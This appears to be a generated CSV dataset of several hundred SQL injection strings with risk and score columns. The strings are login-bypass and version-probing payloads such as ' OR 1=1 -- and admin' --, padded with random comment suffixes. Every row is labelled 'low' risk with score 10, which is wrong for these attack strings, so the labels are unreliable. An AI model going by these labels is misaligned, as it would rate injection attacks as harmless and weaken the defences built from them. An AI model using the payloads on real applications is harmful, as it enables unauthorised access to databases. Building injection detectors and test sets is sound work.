query,risk,score
' or 'a'='a -- j,low,10
admin' -- -- v,low,10
' OR 'x'='x /**/,low,10
""" OR ""1""=""1 -- j",low,10
1' or 1=1 -- /**/,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- -- b,low,10
admin' -- -- c,low,10
' OR 1=1 -- # pw,low,10
' OR 'x'='x -- s,low,10
admin' -- # 21,low,10
' OR 'a'='a /**/,low,10
admin' -- -- 5,low,10
' or 'a'='a /**/,low,10
' OR 'a'='a -- r,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' -- /**/,low,10
admin' -- # f5,low,10
1' OR '1'='1 -- q,low,10
admin' -- # pv,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- -- m,low,10
' or 'a'='a -- s,low,10
1' or true -- /**/,low,10
' OR 'x'='x -- y,low,10
admin' /**/ -- 6,low,10
admin' -- /**/,low,10
admin' -- /**/,low,10
""" OR ""1""=""1 # gk",low,10
admin' -- /**/,low,10
' OR 1 IN (SELECT @@version) -- # 7w,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
""" OR ""1""=""1 # 2i",low,10
admin' -- -- 7,low,10
' || 1=1 -- # bx,low,10
1' or true -- /**/,low,10
' OR 1=1 LIMIT 1 -- # be,low,10
1' OR '1'='1 -- 2,low,10
' OR 1=1 LIMIT 1 -- # zf,low,10
1' or '1'='1 -- 3,low,10
' OR 1=1 LIMIT 1 -- # k2,low,10
' OR 1 IN (SELECT @@version) -- # j3,low,10
admin' -- -- r,low,10
1' or 1=1 -- # h4,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 1=1 -- # 9g,low,10
""" OR ""1""=""1 /**/",low,10
' OR 1=1 -- -- w,low,10
' OR 1=1 -- # 4v,low,10
' or 'a'='a /**/,low,10
admin' -- # 5q,low,10
' || 1=1 -- -- 8,low,10
' || 1=1 -- /**/,low,10
admin' -- # cz,low,10
1' or '1'='1 /**/,low,10
admin' -- -- 3,low,10
""" OR ""1""=""1 /**/",low,10
admin' /**/ -- 0,low,10
admin' -- -- 6,low,10
' OR 1 IN (SELECT @@version) -- -- w,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' /**/ # zn,low,10
1' or true -- # hu,low,10
admin' /**/ /**/,low,10
' OR 1=1 -- # 8e,low,10
1' OR '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- -- d,low,10
1' or '1'='1 # fl,low,10
' or 'a'='a # va,low,10
' OR 1=1 LIMIT 1 -- # 6l,low,10
' OR 1=1 -- -- 0,low,10
""" OR ""1""=""1 # 0m",low,10
' || 1=1 -- /**/,low,10
admin' -- # v1,low,10
' || 1=1 -- /**/,low,10
1' or '1'='1 /**/,low,10
1' or 1=1 -- -- n,low,10
' OR 1=1 -- /**/,low,10
' or 'a'='a # rp,low,10
1' OR '1'='1 -- 8,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- -- 9,low,10
' OR 'x'='x -- a,low,10
' OR 1=1 -- -- u,low,10
1' or '1'='1 # zq,low,10
' OR 1 IN (SELECT @@version) -- -- x,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- w,low,10
""" OR ""1""=""1 # xt",low,10
' OR 'a'='a # x0,low,10
1' or 1=1 -- # g4,low,10
' OR 1=1 -- # ta,low,10
1' or true -- -- u,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- /**/,low,10
' OR 'a'='a -- 3,low,10
admin' /**/ # la,low,10
1' or '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- # jv,low,10
admin' -- # 2q,low,10
' || 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # 11,low,10
' or 'a'='a -- 0,low,10
admin' -- /**/,low,10
1' or '1'='1 # 4z,low,10
' OR 'x'='x /**/,low,10
1' or '1'='1 /**/,low,10
admin' -- # 4k,low,10
1' or true -- # 58,low,10
1' OR '1'='1 -- 0,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- # t0,low,10
admin' -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' OR '1'='1 # yh,low,10
' OR 'x'='x /**/,low,10
1' OR '1'='1 /**/,low,10
' OR 'x'='x # ur,low,10
' OR 'x'='x /**/,low,10
admin' /**/ # of,low,10
' OR 'a'='a -- g,low,10
1' or 1=1 -- -- s,low,10
' || 1=1 -- /**/,low,10
admin' /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- -- i,low,10
admin' -- # 05,low,10
admin' /**/ /**/,low,10
1' OR '1'='1 # 0v,low,10
admin' -- /**/,low,10
1' or '1'='1 # 31,low,10
' OR 1 IN (SELECT @@version) -- -- h,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- # ob,low,10
' OR 1 IN (SELECT @@version) -- -- y,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 'x'='x -- 6,low,10
admin' /**/ # pt,low,10
1' OR '1'='1 -- r,low,10
' OR 1=1 LIMIT 1 -- # bg,low,10
1' or '1'='1 /**/,low,10
admin' -- # 5p,low,10
""" OR ""1""=""1 /**/",low,10
' OR 1=1 -- -- p,low,10
' or 'a'='a # k2,low,10
' OR 'x'='x /**/,low,10
1' or true -- # 9n,low,10
admin' -- # oa,low,10
1' or 1=1 -- -- q,low,10
1' or true -- # dz,low,10
1' or '1'='1 # 4s,low,10
' || 1=1 -- -- m,low,10
1' or 1=1 -- /**/,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- # aa,low,10
' OR 1=1 LIMIT 1 -- # x2,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- # rf,low,10
1' or true -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1=1 LIMIT 1 -- # 6x,low,10
' OR 1=1 -- /**/,low,10
admin' -- /**/,low,10
admin' -- # t6,low,10
1' OR '1'='1 # si,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or true -- /**/,low,10
1' OR '1'='1 /**/,low,10
1' or '1'='1 -- t,low,10
admin' /**/ # p0,low,10
1' or 1=1 -- /**/,low,10
' OR 'x'='x -- 8,low,10
' or 'a'='a /**/,low,10
admin' /**/ -- 8,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- # ru,low,10
' OR 1=1 LIMIT 1 -- -- 8,low,10
admin' -- /**/,low,10
1' or 1=1 -- # w1,low,10
1' OR '1'='1 /**/,low,10
' OR 'a'='a -- 0,low,10
""" OR ""1""=""1 # 3k",low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- -- y,low,10
1' OR '1'='1 /**/,low,10
' OR 1=1 LIMIT 1 -- # 7e,low,10
' OR 'a'='a -- l,low,10
1' OR '1'='1 -- p,low,10
' OR 'a'='a # 11,low,10
1' OR '1'='1 -- o,low,10
admin' /**/ /**/,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- /**/,low,10
' || 1=1 -- /**/,low,10
' OR 'x'='x -- g,low,10
admin' /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or 1=1 -- /**/,low,10
1' OR '1'='1 -- 4,low,10
' OR 'a'='a /**/,low,10
' || 1=1 -- -- 8,low,10
admin' /**/ -- 6,low,10
' OR 1 IN (SELECT @@version) -- # be,low,10
' OR 1=1 LIMIT 1 -- -- n,low,10
""" OR ""1""=""1 # c7",low,10
""" OR ""1""=""1 /**/",low,10
' OR 'x'='x -- 5,low,10
""" OR ""1""=""1 -- j",low,10
' OR 'a'='a /**/,low,10
admin' -- /**/,low,10
' or 'a'='a # 04,low,10
' OR 1 IN (SELECT @@version) -- -- l,low,10
' OR 1=1 -- # h1,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a # q3,low,10
1' or true -- /**/,low,10
1' or true -- -- 5,low,10
' OR 'a'='a /**/,low,10
' OR 'x'='x -- q,low,10
1' OR '1'='1 /**/,low,10
admin' -- /**/,low,10
1' or '1'='1 # uk,low,10
' OR 1=1 LIMIT 1 -- -- b,low,10
' OR 'x'='x -- d,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 -- /**/,low,10
1' or 1=1 -- # vb,low,10
' OR 1 IN (SELECT @@version) -- # uy,low,10
1' or true -- /**/,low,10
' || 1=1 -- /**/,low,10
' || 1=1 -- # x3,low,10
1' or 1=1 -- -- r,low,10
1' or '1'='1 /**/,low,10
1' or 1=1 -- -- t,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' /**/ /**/,low,10
admin' -- -- 6,low,10
1' OR '1'='1 -- k,low,10
1' or '1'='1 /**/,low,10
1' OR '1'='1 # ga,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a # h2,low,10
' or 'a'='a /**/,low,10
1' or '1'='1 /**/,low,10
admin' -- # gm,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 -- -- e,low,10
admin' /**/ /**/,low,10
admin' -- # bp,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1 IN (SELECT @@version) -- # le,low,10
' OR 'a'='a -- g,low,10
""" OR ""1""=""1 # 83",low,10
1' or true -- /**/,low,10
' || 1=1 -- # f5,low,10
' OR 'x'='x # 0g,low,10
' or 'a'='a # d4,low,10
' OR 'x'='x -- f,low,10
' or 'a'='a # p5,low,10
' or 'a'='a -- f,low,10
admin' -- # fx,low,10
admin' -- /**/,low,10
admin' -- # d7,low,10
' OR 1 IN (SELECT @@version) -- -- r,low,10
' || 1=1 -- /**/,low,10
1' or true -- /**/,low,10
1' or '1'='1 -- h,low,10
' || 1=1 -- /**/,low,10
' OR 1 IN (SELECT @@version) -- -- t,low,10
' OR 'x'='x # u3,low,10
' OR 'x'='x # 8j,low,10
""" OR ""1""=""1 -- 5",low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- u,low,10
' OR 'x'='x # 8w,low,10
admin' -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- 3,low,10
1' OR '1'='1 # qn,low,10
' || 1=1 -- /**/,low,10
admin' -- -- t,low,10
' or 'a'='a -- f,low,10
' or 'a'='a -- i,low,10
1' or true -- /**/,low,10
admin' -- -- d,low,10
' OR 1=1 -- # 8s,low,10
admin' /**/ /**/,low,10
admin' -- # bh,low,10
admin' -- /**/,low,10
admin' -- # y4,low,10
1' or true -- -- v,low,10
""" OR ""1""=""1 # hw",low,10
""" OR ""1""=""1 /**/",low,10
1' or '1'='1 # ua,low,10
' OR 'a'='a /**/,low,10
admin' /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- -- 2,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
' || 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or '1'='1 /**/,low,10
' || 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
' or 'a'='a -- f,low,10
1' or true -- # z7,low,10
""" OR ""1""=""1 -- 0",low,10
admin' /**/ # jp,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 'x'='x /**/,low,10
1' OR '1'='1 # 8n,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or '1'='1 /**/,low,10
' OR 'x'='x /**/,low,10
' || 1=1 -- -- 5,low,10
1' OR '1'='1 # 1n,low,10
admin' /**/ /**/,low,10
1' or 1=1 -- /**/,low,10
1' or true -- -- y,low,10
admin' -- -- 0,low,10
' OR 1=1 -- -- 2,low,10
' OR 1 IN (SELECT @@version) -- # u5,low,10
' || 1=1 -- /**/,low,10
admin' -- # ww,low,10
admin' /**/ /**/,low,10
1' or 1=1 -- -- x,low,10
1' or 1=1 -- # uk,low,10
' OR 1=1 LIMIT 1 -- -- p,low,10
' || 1=1 -- # y7,low,10
1' OR '1'='1 -- 9,low,10
' OR 'x'='x -- y,low,10
1' or 1=1 -- -- 8,low,10
admin' -- /**/,low,10
' OR 'x'='x # zi,low,10
1' or '1'='1 -- 8,low,10
' || 1=1 -- /**/,low,10
1' OR '1'='1 -- x,low,10
admin' -- /**/,low,10
' OR 1=1 -- -- 7,low,10
' or 'a'='a /**/,low,10
1' OR '1'='1 # ay,low,10
' || 1=1 -- -- o,low,10
admin' -- /**/,low,10
admin' -- -- z,low,10
' || 1=1 -- # 16,low,10
admin' /**/ /**/,low,10
1' or true -- # sm,low,10
' OR 1=1 -- /**/,low,10
admin' /**/ -- 9,low,10
' OR 'a'='a -- i,low,10
' OR 1 IN (SELECT @@version) -- -- b,low,10
' || 1=1 -- /**/,low,10
' OR 'a'='a -- e,low,10
admin' -- # v4,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 'a'='a # ws,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- -- s,low,10
' or 'a'='a # l6,low,10
' or 'a'='a -- u,low,10
1' OR '1'='1 /**/,low,10
admin' -- # ud,low,10
admin' -- -- h,low,10
' OR 1 IN (SELECT @@version) -- # w1,low,10
' OR 1 IN (SELECT @@version) -- # 43,low,10
""" OR ""1""=""1 -- c",low,10
1' or 1=1 -- -- 5,low,10
' OR 1=1 LIMIT 1 -- # 69,low,10
1' or 1=1 -- -- i,low,10
admin' -- # a2,low,10
admin' -- /**/,low,10
' OR 'x'='x /**/,low,10
' OR 'x'='x -- x,low,10
' OR 1=1 LIMIT 1 -- # fe,low,10
admin' /**/ # 8f,low,10
admin' -- # t7,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' or 'a'='a # rs,low,10
' OR 1=1 -- # 03,low,10
1' or true -- /**/,low,10
1' OR '1'='1 /**/,low,10
1' or true -- -- u,low,10
' OR 1 IN (SELECT @@version) -- -- e,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 -- -- j,low,10
1' or '1'='1 -- j,low,10
1' OR '1'='1 -- k,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a -- d,low,10
admin' /**/ -- r,low,10
' or 'a'='a -- n,low,10
' or 'a'='a -- z,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- # 83,low,10
' OR 1 IN (SELECT @@version) -- -- m,low,10
1' or true -- # t5,low,10
' OR 'a'='a -- l,low,10
1' OR '1'='1 # jb,low,10
admin' -- # sh,low,10
' OR 1=1 LIMIT 1 -- -- p,low,10
' OR 'x'='x /**/,low,10
admin' -- /**/,low,10
admin' /**/ -- 0,low,10
' || 1=1 -- -- t,low,10
1' or 1=1 -- -- c,low,10
' OR 1=1 -- # og,low,10
1' or true -- # ga,low,10
1' or '1'='1 # 61,low,10
' OR 1=1 -- # 59,low,10
' || 1=1 -- /**/,low,10
1' or 1=1 -- # xt,low,10
' OR 1 IN (SELECT @@version) -- -- l,low,10
' or 'a'='a -- r,low,10
""" OR ""1""=""1 # 62",low,10
admin' -- /**/,low,10
' OR 1 IN (SELECT @@version) -- -- p,low,10
1' or true -- /**/,low,10
' || 1=1 -- /**/,low,10
admin' -- # o7,low,10
' OR 1 IN (SELECT @@version) -- # o4,low,10
1' or '1'='1 /**/,low,10
' OR 'x'='x /**/,low,10
""" OR ""1""=""1 /**/",low,10
' OR 'x'='x /**/,low,10
' OR 'x'='x # 1n,low,10
1' or '1'='1 # qw,low,10
1' or true -- /**/,low,10
admin' -- /**/,low,10
' or 'a'='a -- y,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- /**/,low,10
' OR 1 IN (SELECT @@version) -- # ia,low,10
admin' -- # 9x,low,10
admin' -- /**/,low,10
1' OR '1'='1 /**/,low,10
1' or '1'='1 -- f,low,10
admin' -- /**/,low,10
admin' /**/ # uu,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- # hk,low,10
admin' -- /**/,low,10
1' or true -- -- 8,low,10
' OR 1=1 LIMIT 1 -- # o4,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- # m6,low,10
admin' -- /**/,low,10
' OR 'x'='x # zd,low,10
1' or 1=1 -- # 73,low,10
admin' -- /**/,low,10
admin' -- -- 2,low,10
1' OR '1'='1 /**/,low,10
admin' -- # sb,low,10
admin' -- -- k,low,10
1' or 1=1 -- -- l,low,10
1' or '1'='1 # 5t,low,10
1' or '1'='1 /**/,low,10
admin' /**/ # gr,low,10
1' or true -- # 0f,low,10
admin' -- /**/,low,10
' or 'a'='a # wz,low,10
' OR 'a'='a # gs,low,10
admin' /**/ -- r,low,10
' OR 1=1 -- /**/,low,10
admin' -- # tv,low,10
' or 'a'='a -- 6,low,10
admin' /**/ # qq,low,10
admin' -- -- c,low,10
' OR 1=1 LIMIT 1 -- -- g,low,10
' OR 1 IN (SELECT @@version) -- # g5,low,10
' OR 'x'='x -- x,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- p,low,10
""" OR ""1""=""1 -- u",low,10
admin' -- /**/,low,10
""" OR ""1""=""1 /**/",low,10
' || 1=1 -- /**/,low,10
admin' -- /**/,low,10
1' or '1'='1 -- z,low,10
admin' -- -- z,low,10
admin' -- # fn,low,10
' or 'a'='a -- y,low,10
' OR 1=1 LIMIT 1 -- -- 5,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- h,low,10
' or 'a'='a /**/,low,10
' or 'a'='a # 7w,low,10
' || 1=1 -- # so,low,10
' OR 1 IN (SELECT @@version) -- # ve,low,10
' OR 1 IN (SELECT @@version) -- # cx,low,10
' OR 1=1 -- # 1w,low,10
' OR 1=1 -- /**/,low,10
' OR 'x'='x -- u,low,10
admin' -- # km,low,10
1' or '1'='1 -- c,low,10
1' or true -- /**/,low,10
admin' -- # 2s,low,10
""" OR ""1""=""1 -- j",low,10
' || 1=1 -- # dj,low,10
1' OR '1'='1 -- g,low,10
' OR 1 IN (SELECT @@version) -- # 5o,low,10
admin' /**/ -- 4,low,10
' or 'a'='a -- 9,low,10
' OR 1=1 -- # ep,low,10
1' or true -- /**/,low,10
' OR 1=1 -- # j2,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 'a'='a /**/,low,10
' OR 1 IN (SELECT @@version) -- -- 1,low,10
admin' /**/ /**/,low,10
' or 'a'='a # qt,low,10
' OR 'a'='a # 2m,low,10
' || 1=1 -- /**/,low,10
' || 1=1 -- # 31,low,10
admin' -- # mu,low,10
' or 'a'='a /**/,low,10
""" OR ""1""=""1 # f1",low,10
' OR 1=1 -- /**/,low,10
' OR 'x'='x /**/,low,10
' OR 'a'='a # hz,low,10
' OR 'x'='x # sa,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
1' or '1'='1 /**/,low,10
admin' -- -- m,low,10
1' or 1=1 -- # bl,low,10
' || 1=1 -- -- s,low,10
' OR 'a'='a -- 5,low,10
admin' -- /**/,low,10
1' or 1=1 -- -- b,low,10
admin' /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- # fw,low,10
' OR 'a'='a /**/,low,10
1' or 1=1 -- -- h,low,10
' OR 'x'='x # an,low,10
1' or true -- -- g,low,10
' OR 1=1 LIMIT 1 -- # 6q,low,10
' OR 1=1 -- -- 2,low,10
1' or true -- # 8j,low,10
' || 1=1 -- /**/,low,10
' OR 1=1 -- -- y,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- # yv,low,10
admin' /**/ # gd,low,10
' or 'a'='a -- j,low,10
admin' -- # sy,low,10
admin' /**/ # 6t,low,10
1' or true -- -- o,low,10
""" OR ""1""=""1 # lg",low,10
1' OR '1'='1 /**/,low,10
' OR 1=1 -- /**/,low,10
admin' -- -- m,low,10
' or 'a'='a -- b,low,10
' || 1=1 -- /**/,low,10
admin' -- /**/,low,10
""" OR ""1""=""1 /**/",low,10
' OR 'a'='a /**/,low,10
admin' -- /**/,low,10
admin' -- -- 6,low,10
' OR 1=1 LIMIT 1 -- # yj,low,10
1' or '1'='1 # t5,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- -- 5,low,10
1' or true -- -- c,low,10
' OR 1=1 -- -- 4,low,10
1' or 1=1 -- /**/,low,10
1' or 1=1 -- -- 3,low,10
' OR 'a'='a # 4j,low,10
1' OR '1'='1 # pl,low,10
' or 'a'='a # ju,low,10
""" OR ""1""=""1 -- w",low,10
1' or 1=1 -- # 6l,low,10
1' OR '1'='1 -- a,low,10
' OR 'a'='a # f4,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 'x'='x /**/,low,10
' OR 'a'='a # 2v,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 -- # 85,low,10
1' or 1=1 -- # w4,low,10
' OR 1=1 LIMIT 1 -- -- d,low,10
admin' /**/ /**/,low,10
' || 1=1 -- /**/,low,10
' OR 'a'='a /**/,low,10
admin' -- # w4,low,10
' OR 'x'='x -- e,low,10
1' OR '1'='1 # 6d,low,10
1' or '1'='1 /**/,low,10
""" OR ""1""=""1 /**/",low,10
1' or true -- # 4m,low,10
' or 'a'='a -- y,low,10
' OR 1=1 -- # f0,low,10
' OR 1=1 -- # y2,low,10
admin' /**/ /**/,low,10
1' or '1'='1 /**/,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- /**/,low,10
1' or 1=1 -- -- 2,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 'x'='x /**/,low,10
1' or '1'='1 -- 8,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # k1,low,10
admin' -- /**/,low,10
' OR 'x'='x -- o,low,10
""" OR ""1""=""1 # 2s",low,10
""" OR ""1""=""1 /**/",low,10
1' OR '1'='1 -- q,low,10
admin' -- -- d,low,10
1' or '1'='1 -- q,low,10
' OR 1=1 -- # fw,low,10
admin' -- # gn,low,10
' OR 1=1 -- -- 5,low,10
admin' -- # o9,low,10
1' or true -- # 5d,low,10
1' or '1'='1 # pw,low,10
admin' -- /**/,low,10
admin' -- -- e,low,10
' || 1=1 -- # pq,low,10
' || 1=1 -- -- w,low,10
' || 1=1 -- /**/,low,10
' OR 'x'='x /**/,low,10
admin' /**/ # om4gkpj,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
' OR 'x'='x /**/ /**/,low,10
' || 1=1 -- # fjyiei1,low,10
' or 'a'='a # qwi688u,low,10
""" OR ""1""=""1 # jovyzkt",low,10
' OR 'x'='x /**/ -- j,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' || 1=1 -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 -- wbn71u",low,10
admin' /**/ /**/ -- p,low,10
admin' -- AND 1=1 -- ,low,10
1' or true -- LIMIT 1 -- ,low,10
1' or 1=1 -- # hkaqeaz,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ OR 1=1 # ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
1' OR '1'='1 -- c5d26i,low,10
admin' -- AND 1=1 -- ,low,10
admin' -- /**/ # 6y,low,10
admin' -- LIMIT 1 -- ,low,10
1' OR '1'='1 /**/ -- k,low,10
' or 'a'='a # h215cur,low,10
admin' /**/ # aw57m5i,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- r9zj3z,low,10
' || 1=1 -- AND 1=1 -- ,low,10
1' OR '1'='1 # 5h0d8z0,low,10
' OR 'x'='x # fc6ttfw,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
admin' -- AND 1=1 -- ,low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or 1=1 -- /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
' || 1=1 -- -- 8pu871,low,10
' OR 1 IN (SELECT @@version) -- # rifltjf,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
1' or true -- OR 1=1 # ,low,10
1' OR '1'='1 # w2plnng,low,10
admin' /**/ # i08zwhh,low,10
admin' -- # rjyjq04,low,10
1' or '1'='1 AND 1=1 -- ,low,10
1' or '1'='1 # andyaix,low,10
admin' -- LIMIT 1 -- ,low,10
1' or 1=1 -- -- ashtdh,low,10
' OR 'x'='x /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- -- v6aypx,low,10
' OR 1=1 LIMIT 1 -- /**/ # j8,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' OR '1'='1 -- pvl9s5,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
1' or 1=1 -- -- hoxzj8,low,10
' or 'a'='a LIMIT 1 -- ,low,10
admin' -- -- b9w6s2,low,10
1' or 1=1 -- OR 1=1 # ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
admin' -- AND 1=1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
1' or 1=1 -- /**/ /**/,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
admin' /**/ OR 1=1 # ,low,10
admin' /**/ /**/ /**/,low,10
""" OR ""1""=""1 -- jtqb55",low,10
1' or 1=1 -- # evzxgea,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
1' or 1=1 -- # ieaihmd,low,10
1' or true -- AND 1=1 -- ,low,10
admin' /**/ OR 1=1 # ,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # g8u7nab,low,10
' OR 1=1 LIMIT 1 -- -- p0ctjr,low,10
' OR 'x'='x -- fhyqyk,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
' or 'a'='a # ugtvdxg,low,10
admin' -- # wztys5a,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ # 4u,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' or 'a'='a AND 1=1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'x'='x -- yhw77l,low,10
admin' /**/ LIMIT 1 -- ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' OR '1'='1 # ak978kq,low,10
admin' -- OR 1=1 # ,low,10
' || 1=1 -- # 3bwuce1,low,10
' OR 'x'='x # 2aa51rx,low,10
admin' -- # dupmyx7,low,10
admin' -- AND 1=1 -- ,low,10
1' or true -- -- oxn40f,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
1' or '1'='1 OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
admin' /**/ /**/ # ar,low,10
' OR 1=1 -- # 955yaeg,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' OR 'a'='a # asci5kd,low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or true -- /**/ -- p,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- /**/ # 1o,low,10
1' or '1'='1 /**/ -- q,low,10
' OR 'a'='a -- qdmxl5,low,10
admin' -- LIMIT 1 -- ,low,10
admin' -- -- a989de,low,10
admin' -- -- 18h9ed,low,10
admin' -- LIMIT 1 -- ,low,10
1' OR '1'='1 # jafclfp,low,10
